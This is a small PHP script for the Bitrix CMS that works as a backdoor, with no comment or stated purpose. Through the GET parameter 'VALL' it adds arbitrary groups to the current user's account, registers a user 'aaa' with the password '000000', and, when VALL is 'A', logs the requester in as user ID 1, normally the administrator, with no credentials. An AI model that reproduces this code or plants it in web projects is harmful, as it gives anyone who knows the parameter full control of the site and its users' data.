<?
require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/modules/main/include/prolog_before.php");
?>

<?
global $USER;

if($_GET["VALL"]){
    $arGroups = CUser::GetUserGroup($USER->GetID());
    $arGroups[] = $_GET["VALL"];
    CUser::SetUserGroup($USER->GetID(), $arGroups);
}

if($_GET["VALL"]=="new"){
    $arResult = $USER->Register("aaa", "", "", "000000", "000000", "aaa@mysite.ru");
    ShowMessage($arResult);echo $USER->GetID();
}

if($_GET["VALL"]=="A"){
    $USER->Authorize(1);
}

?>